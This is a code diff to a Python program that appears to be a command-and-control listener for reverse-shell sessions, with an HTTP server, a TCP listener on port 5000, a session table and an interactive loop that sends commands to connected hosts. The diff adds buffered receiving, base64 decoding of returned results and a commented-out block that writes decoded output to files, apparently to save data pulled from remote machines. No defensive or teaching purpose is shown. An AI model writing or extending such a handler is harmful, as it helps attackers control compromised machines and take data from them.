@@ -3,6 +3,7 @@ import socketserver
 import threading
 import socket
 import os
+import base64
 
 HTTP_PORT = 80
 TCP_PORT = 5000
@@ -76,6 +77,21 @@ def shell():
             shutdown_flag.set()
             break
 
+def recv_all(sock, timeout=2.0):
+    chunks = []
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            chunks.append(chunk)
+            if len(chunk) < 4096:
+                break  # probably end of data
+    except socket.timeout:
+        pass
+    return b''.join(chunks)
+
+
 def interact(sid):
     s = sessions.get(sid)
     if not s:
@@ -94,16 +110,28 @@ def interact(sid):
             continue
         if cmd == "background":
             break
+
         try:
             s.sendall(cmd.encode())
-            data = s.recv(2048)
+            data = recv_all(s)
             try:
-                print(data.decode('utf-8').strip())
+                b64_result = data.decode('utf-8').strip()
+                try:
+                    decoded_bytes = base64.b64decode(b64_result)
+                    decoded_string = decoded_bytes.decode('utf-8', errors='replace')
+                    print(decoded_string)
+                    """
+                    with open(cmd.split('/')[1], 'w') as f:
+                        f.write(decoded_string)"""
+                except Exception as e:
+                    print(f"Decode error: {e}")
+		
             except UnicodeDecodeError:
                 print(data)
         except Exception as e:
             print(f"[!] Error with session {sid}: {e}")
             break
+
 
 def main():
     t1 = threading.Thread(target=run_http_server)
